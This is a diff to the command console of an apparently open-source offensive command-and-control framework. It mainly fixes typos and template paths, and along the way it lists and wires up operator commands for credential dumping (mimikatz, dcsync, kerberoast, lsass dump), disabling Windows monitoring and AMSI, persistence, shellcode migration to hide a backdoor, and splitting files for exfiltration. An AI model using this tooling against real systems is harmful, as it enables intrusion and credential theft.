@@ -17,7 +17,7 @@ from core import webshell
 from core.Encryption import *
 from core.color import *
 from core.config import *
-from lib import prettytable
+from core.lib import prettytable
 from subprocess import call
 
 console = Console()
@@ -81,7 +81,7 @@ class cmd:
                     ['reset', 'Clear screen'],
                     ['list', 'List all agents'],
                     ['help', 'Help menu'],
-                    ['show', 'Show Command and Controler variables'],
+                    ['show', 'Show Command and Controller variables'],
                     ['use', 'Interact with AGENT'],
                     ['back', 'Back to the main'],
                     ['payload', 'Show Payloads'],
@@ -95,23 +95,23 @@ class cmd:
                     ['upload', 'upload files to the victim'],
                     ['modules', 'list all the Available modules in Modules directory'],
                     ['encode64', 'encode any command to base64 encoded UTF-8 command ( can be decoded in powershell)'],
-                    ['gen_ntlm', 'generate ntlm hash for given passowrd'],
+                    ['gen_ntlm', 'generate ntlm hash for given password'],
                     ['drm', 'disable windows realtime monitoring - require admin privileges'],
-                    ['screenshot', 'take screenshot form  the victim'],
+                    ['screenshot', 'take screenshot from victim machine'],
                     ['DA', 'Run defense Analysis Module'],
                     ['kerb', 'do kerberoast attack  and dump  service accounts hashes'],
                     ['dcsync_all', 'do dcsync attack and get all users hashes'],
-                    ['dcsync_admins', 'do dcsync attack agains admin users'],
+                    ['dcsync_admins', 'do dcsync attack against admin users'],
                     ['dumpcreds', 'load mimikatz and dump credentials'],
-                    ['dcsync_list', 'do dcsync attack agains custom user list '],
+                    ['dcsync_list', 'do dcsync attack against custom user list '],
                     ['get_groups', 'get all the groups user is member of'],
                     ['get_users', 'get all the users member in group'],
                     ['bloodhound', 'run bloodhound to collect all the information about the AD'],
-                    ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
+                    ['unmanged_powershell', 'run powershell payload through the dotnet agent'],
                     ['persist_schtasks', 'persistence using schedule tasks'],
                     ['migrate',
                      'migrate to new process ( default nslookup ) to hide the backdoor , this command will only work if you enabled donut in campaign creation '],
-                    ['processlist', 'list processes formated ( Name , ID , Commandline)'],
+                    ['processlist', 'list processes formatted ( Name , ID , Commandline)'],
                     ['split',
                      'split file to small size files for data exfiltration (use join command for files in current server or use join.ps1 script to join data on windows )'],
                     ['join',
@@ -284,7 +284,7 @@ class cmd:
 
     def load(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         fpm = open('Modules/' + args[1], 'r')
         module = fpm.read()
@@ -293,7 +293,7 @@ class cmd:
 
     def downloads(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if os.path.isdir("downloads"):
             downloads = os.listdir("downloads")
@@ -332,7 +332,7 @@ class cmd:
 
     def DA(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         if config.Implant_Type != 'agent':
@@ -343,7 +343,7 @@ class cmd:
 
     def kerb(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         # config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         if config.Implant_Type != 'agent':
@@ -355,7 +355,7 @@ class cmd:
 
     def dcsync_admins(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -367,7 +367,7 @@ class cmd:
 
     def dcsync_all(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -379,7 +379,7 @@ class cmd:
 
     def dcsync_list(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -407,7 +407,7 @@ class cmd:
 
     def get_groups(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -426,7 +426,7 @@ class cmd:
 
     def get_users(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -444,7 +444,7 @@ class cmd:
 
     def bloodhound(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -457,7 +457,7 @@ class cmd:
 
     def drm(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -467,7 +467,7 @@ class cmd:
 
     def dis_amsi(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -476,7 +476,7 @@ class cmd:
 
     def dumpcreds(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -487,7 +487,7 @@ class cmd:
 
     def persist_schtasks(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -519,7 +519,7 @@ class cmd:
             else:
                 CC = ''
                 continue
-        if SSL == True:
+        if SSL:
             http = "https"
         else:
             http = "http"
@@ -532,15 +532,15 @@ class cmd:
 
     def screenshot(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
             return
-        f = open("agents/screenshot.ninja", "r")
+        f = open("core/agents/screenshot.ninja", "r")
         payload = f.read()
         f.close()
-        if SSL == True:
+        if SSL:
             payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace(
                 '{cmd}', command_url).replace('{HTTP}', "https")
         else:
@@ -554,12 +554,12 @@ class cmd:
 
     def upload(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type == 'webshell':
             _thread.start_new_thread(webshell.upload_file, (config.WEBSHELLS[config.POINTER], args,))
         else:
-            f = open("agents/upload.ninja", "r")
+            f = open("core/agents/upload.ninja", "r")
             payload = f.read()
             f.close()
             if SSL == True:
@@ -576,13 +576,13 @@ class cmd:
 
     def download(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type == 'webshell':
             _thread.start_new_thread(webshell.download_file, (config.WEBSHELLS[config.POINTER], args,))
         else:
             global loaded
-            f = open("agents/download.ninja", "r")
+            f = open("core/agents/download.ninja", "r")
             payload = f.read()
             f.close()
             if SSL == True:
@@ -602,7 +602,7 @@ class cmd:
 
     def set_beacon(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -612,7 +612,7 @@ class cmd:
 
     def unamanged_powershell(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -622,7 +622,7 @@ class cmd:
 
     def migrate(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -632,7 +632,7 @@ class cmd:
             return
         global loaded
         shellcode = donut.create(file="payloads/dropper_cs.exe")
-        fp = open('agents/Migrator.ninja', 'r')
+        fp = open('core/agents/Migrator.ninja', 'r')
         temp = fp.read()
         temp = temp.replace('{shellcode}', base64.b64encode(shellcode).decode("utf-8")).replace('{class}', "".join(
             [random.choice(string.ascii_uppercase) for i in range(5)]))
@@ -643,7 +643,7 @@ class cmd:
 
     def processlist(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -654,7 +654,7 @@ class cmd:
 
     def split(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
@@ -758,7 +758,7 @@ class cmd:
 
     def lsass_memory_dump(self, args=None):
         if config.get_pointer() == 'main':
-            print("you can't use this command in main ! chose an agent")
+            print("you can't use this command in main ! choose an agent")
             return
         if config.Implant_Type != 'agent':
             print("This command can only be used in agent mode")
